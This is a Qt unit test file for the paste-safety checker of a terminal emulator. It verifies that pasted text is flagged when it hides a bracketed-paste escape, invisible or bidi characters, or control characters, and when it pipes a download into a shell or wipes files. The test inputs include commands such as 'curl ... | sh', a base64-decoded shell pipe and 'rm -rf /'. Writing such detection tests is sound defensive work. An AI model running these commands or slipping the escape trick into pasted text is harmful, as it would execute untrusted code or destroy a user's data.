// Maze Terminal — paste guard tests. GPL-2.0-or-later.
#include <QTest>

#include "../src/maze/pasteguard.h"

using Maze::PasteGuard;
using Maze::PasteVerdict;

class PasteGuardTest : public QObject
{
    Q_OBJECT
private Q_SLOTS:
    void ordinary_commands_are_clean()
    {
        for (const char *s : {"ls -la", "git status\n", "cd ~/Downloads && make -j8",
                              "echo 'naïve café — ok'", "for f in *.png; do echo $f; done",
                              "curl -O https://example.com/file.tar.gz"}) {
            QCOMPARE(PasteGuard::inspect(QString::fromUtf8(s)).level, PasteVerdict::Clean);
        }
    }

    void escape_sequence_is_danger()
    {
        // ESC[201~ ends bracketed paste: whatever follows runs as typed.
        const QString evil = QStringLiteral("echo hi\x1b[201~rm -rf ~\n");
        const PasteVerdict v = PasteGuard::inspect(evil);
        QCOMPARE(v.level, PasteVerdict::Danger);
        QVERIFY(PasteGuard::reveal(evil).contains(QStringLiteral("␛[201~")));
        QVERIFY(!PasteGuard::clean(evil).contains(QChar(0x1B)));
    }

    void invisible_and_bidi_characters_are_danger()
    {
        const QString zw = QStringLiteral("git clone https://github.com/real/re") + QChar(0x200B) + QStringLiteral("po");
        QCOMPARE(PasteGuard::inspect(zw).level, PasteVerdict::Danger);
        QVERIFY(PasteGuard::reveal(zw).contains(QStringLiteral("⟦U+200B⟧")));
        QCOMPARE(PasteGuard::clean(zw), QStringLiteral("git clone https://github.com/real/repo"));

        const QString rlo = // Built from its code point: written literally, the override would
        // reorder this very source line — the attack being tested.
        QStringLiteral("cat notes") + QChar(0x202E) + QStringLiteral("txt.sh");
        QCOMPARE(PasteGuard::inspect(rlo).level, PasteVerdict::Danger);

        const QString nbsp = QStringLiteral("rm") + QChar(0x00A0) + QStringLiteral("-rf /tmp/x");
        QCOMPARE(PasteGuard::inspect(nbsp).level, PasteVerdict::Danger);
        QCOMPARE(PasteGuard::clean(nbsp), QStringLiteral("rm -rf /tmp/x"));
    }

    void control_characters_are_danger()
    {
        QCOMPARE(PasteGuard::inspect(QStringLiteral("ls\x08\x08rm")).level, PasteVerdict::Danger);
        QCOMPARE(PasteGuard::inspect(QStringLiteral("ls\tx")).level, PasteVerdict::Clean);
    }

    void download_and_run_is_caution()
    {
        for (const char *s : {"curl -fsSL https://get.example.sh | sh",
                              "wget -qO- https://x.io/install | sudo bash",
                              "bash <(curl -s https://x.io/i)",
                              "eval \"$(curl -s https://x.io/i)\"",
                              "echo aGk= | base64 -d | sh"}) {
            const PasteVerdict v = PasteGuard::inspect(QString::fromUtf8(s));
            QVERIFY2(v.level == PasteVerdict::Caution, s);
            QVERIFY(!v.reasons.isEmpty());
        }
    }

    void root_and_wipes_are_caution()
    {
        QCOMPARE(PasteGuard::inspect(QStringLiteral("sudo pacman -Syu")).level, PasteVerdict::Caution);
        QCOMPARE(PasteGuard::inspect(QStringLiteral("rm -rf ~")).level, PasteVerdict::Caution);
        QCOMPARE(PasteGuard::inspect(QStringLiteral("rm -rf /")).level, PasteVerdict::Caution);
        QCOMPARE(PasteGuard::inspect(QStringLiteral("rm -rf ./build")).level, PasteVerdict::Clean);
        QCOMPARE(PasteGuard::inspect(QStringLiteral("dd if=x.iso of=/dev/sdb bs=4M")).level,
                 PasteVerdict::Caution);
        QCOMPARE(PasteGuard::inspect(QStringLiteral("echo pseudo sudoku")).level, PasteVerdict::Clean);
    }

    void danger_wins_over_caution()
    {
        const PasteVerdict v = PasteGuard::inspect(QStringLiteral("sudo rm") + QChar(0x200B) + QStringLiteral(" -rf /"));
        QCOMPARE(v.level, PasteVerdict::Danger);
        QVERIFY(v.reasons.size() >= 2);
    }

    void clean_strips_trailing_newlines_so_nothing_runs_by_itself()
    {
        QCOMPARE(PasteGuard::clean(QStringLiteral("ls\r\n\n")), QStringLiteral("ls"));
        QCOMPARE(PasteGuard::inspect(QStringLiteral("a\nb\nc\n")).lines, 3);
    }

    void reveal_keeps_blank_lines()
    {
        QCOMPARE(PasteGuard::reveal(QStringLiteral("a\r\n\r\nb")), QStringLiteral("a⏎\n⏎\nb"));
    }
};

QTEST_GUILESS_MAIN(PasteGuardTest)
#include "maze_pasteguard_test.moc"
